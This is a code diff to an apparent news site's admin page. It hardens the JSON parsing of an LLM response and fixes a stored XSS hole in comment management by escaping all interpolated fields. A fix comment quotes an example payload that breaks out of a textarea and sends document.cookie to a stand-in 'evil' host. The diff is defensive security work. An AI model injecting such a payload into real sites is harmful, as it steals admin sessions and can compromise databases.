@@ -5440,8 +5440,35 @@ async function runAutoGenerate(){
       });
       const bodyText = bodyRes.content && bodyRes.content[0] && bodyRes.content[0].text || '';
       if (!bodyText) throw new Error('빈 응답 (body)');
-      const bodyClean = bodyText.replace(/^```json?/,'').replace(/^```/,'').replace(/```$/,'').trim();
-      const bodyJson = JSON.parse(bodyClean);
+      // Robust JSON extraction. Previous version stripped markdown
+      // fences then JSON.parse'd directly — broke when Sonnet
+      // appended explanatory prose after the closing brace
+      // ("Unexpected non-whitespace character after JSON at position
+      // 1398 line 13 column 1"). Mirror the daily-content-gen pattern:
+      // find the first `{` and last `}`, slice between, then try
+      // parse → repair → parse before giving up. Catches:
+      //   - trailing prose / markdown fence remnants
+      //   - leading "Here is the JSON:" or similar preamble
+      //   - trailing commas (`,}` / `,]`)
+      let bodyClean = bodyText.replace(/```json?/g, '').replace(/```/g, '').trim();
+      const _s = bodyClean.indexOf('{');
+      const _e = bodyClean.lastIndexOf('}');
+      if (_s < 0 || _e <= _s) throw new Error('No JSON object in body response');
+      bodyClean = bodyClean.slice(_s, _e + 1);
+      let bodyJson;
+      try {
+        bodyJson = JSON.parse(bodyClean);
+      } catch (_parseErr) {
+        // Repair trailing commas + control chars before retry.
+        const repaired = bodyClean
+          .replace(/,(\s*[}\]])/g, '$1')
+          .replace(/[ -]+/g, ' ');
+        try {
+          bodyJson = JSON.parse(repaired);
+        } catch (_repairErr) {
+          throw new Error('JSON parse failed even after repair: ' + (_repairErr && _repairErr.message || _repairErr));
+        }
+      }
       if (!bodyJson.title || !bodyJson.body) throw new Error('Invalid body format');
 
       // PR #7AX: Phase A only — body call is done above. The Haiku
@@ -8288,6 +8315,15 @@ async function loadAllComments() {
     var rows = (res.data && res.data.length) ? res.data : [];
     if(!rows.length) { wrap.innerHTML='<div class="infobox">아직 댓글이 없어요.</div>'; return; }
 
+    // MOD-F1: stored XSS hole. Previously interpolated c.user_name /
+    // c.content / c.reply / artTitle raw into innerHTML, AND raw into
+    // a <textarea> body. A commenter posting
+    //   </textarea><script>fetch('https://evil/?c='+document.cookie)</script>
+    // would own the admin session on next 💬 Comment Management open.
+    // Admin uses x-admin-bypass header / service-role context, so XSS
+    // here = full-DB compromise. Route every interpolation through esc()
+    // and rebuild — esc handles & < > " across HTML body + attribute +
+    // textarea-body contexts.
     wrap.innerHTML = '<div style="font-size:13px;color:var(--gr);margin-bottom:12px">총 '+rows.length+'개 댓글</div>'
       + rows.map(function(c) {
           var art = DB.find(function(a){ return a.id===c.article_id; });
@@ -8296,19 +8332,19 @@ async function loadAllComments() {
           return '<div style="background:#fff;border:1px solid var(--bo);border-radius:10px;padding:16px 18px;margin-bottom:10px">'
             +'<div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px">'
             +'<div style="font-size:12px;color:var(--gr)">'
-            +'<a href="korehan-article.html?id='+c.article_id+'" target="_blank" style="color:var(--a);font-weight:700">'+artTitle+'</a>'
-            +' · '+c.user_name+' · '+dateStr
+            +'<a href="korehan-article.html?id='+esc(c.article_id)+'" target="_blank" style="color:var(--a);font-weight:700">'+esc(artTitle)+'</a>'
+            +' · '+esc(c.user_name)+' · '+esc(dateStr)
             +'</div>'
-            +'<button data-id="'+c.id+'" onclick="adminDeleteComment(this.dataset.id)" style="background:none;border:none;color:#ccc;cursor:pointer;font-size:13px;padding:2px 6px">🗑</button>'
+            +'<button data-id="'+esc(c.id)+'" onclick="adminDeleteComment(this.dataset.id)" style="background:none;border:none;color:#ccc;cursor:pointer;font-size:13px;padding:2px 6px">🗑</button>'
             +'</div>'
-            +'<div style="font-size:14px;color:#222;margin-bottom:10px">'+(c.content||c.body||'(내용 없음)')+'</div>'
+            +'<div style="font-size:14px;color:#222;margin-bottom:10px;white-space:pre-wrap">'+esc(c.content||c.body||'(내용 없음)')+'</div>'
             +(c.reply
-              ? '<div style="background:#f0f4ff;border-left:3px solid var(--a);padding:8px 12px;border-radius:0 6px 6px 0;font-size:13px;margin-bottom:8px"><b>내 답변:</b> '+c.reply+'</div>'
+              ? '<div style="background:#f0f4ff;border-left:3px solid var(--a);padding:8px 12px;border-radius:0 6px 6px 0;font-size:13px;margin-bottom:8px;white-space:pre-wrap"><b>내 답변:</b> '+esc(c.reply)+'</div>'
               : ''
 )
             +'<div style="display:flex;gap:8px;align-items:flex-end">'
-            +'<textarea data-id="'+c.id+'" placeholder="답변 입력…" style="flex:1;padding:8px 12px;border:1.5px solid var(--bo);border-radius:8px;font-size:13px;font-family:inherit;resize:vertical;min-height:60px">'+(c.reply||'')+'</textarea>'
-            +'<button data-id="'+c.id+'" onclick="adminReplyComment(this.dataset.id,this)" style="padding:8px 18px;background:var(--a);color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;white-space:nowrap">답변 Save</button>'
+            +'<textarea data-id="'+esc(c.id)+'" placeholder="답변 입력…" style="flex:1;padding:8px 12px;border:1.5px solid var(--bo);border-radius:8px;font-size:13px;font-family:inherit;resize:vertical;min-height:60px">'+esc(c.reply||'')+'</textarea>'
+            +'<button data-id="'+esc(c.id)+'" onclick="adminReplyComment(this.dataset.id,this)" style="padding:8px 18px;background:var(--a);color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;white-space:nowrap">답변 Save</button>'
             +'</div>'
             +'</div>';
         }).join('');
